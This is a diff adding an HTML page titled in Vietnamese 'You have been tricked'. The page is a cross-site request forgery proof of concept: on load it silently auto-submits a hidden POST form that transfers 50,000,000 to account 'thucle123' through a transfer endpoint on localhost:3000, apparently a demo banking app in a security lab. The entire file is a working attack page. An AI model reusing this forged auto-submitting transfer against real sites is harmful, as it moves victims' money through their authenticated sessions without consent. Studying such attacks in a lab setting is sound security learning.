@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bạn đã bị lừa</title>
+</head>
+<body onload="document.transferForm.submit()">  
+    <!-- onload="document.transferForm.submit()" -->
+    <!-- form được gửi đi đến action mà người dùng k cần ấn submit -->
+    <form method="POST" 
+        name="transferForm"
+        action="http://localhost:3000/index/transfer">
+        <input type="text" name="account" value="thucle123">
+        <input type="number" name="amount" value="50000000">
+    </form>
+</body>
+</html>
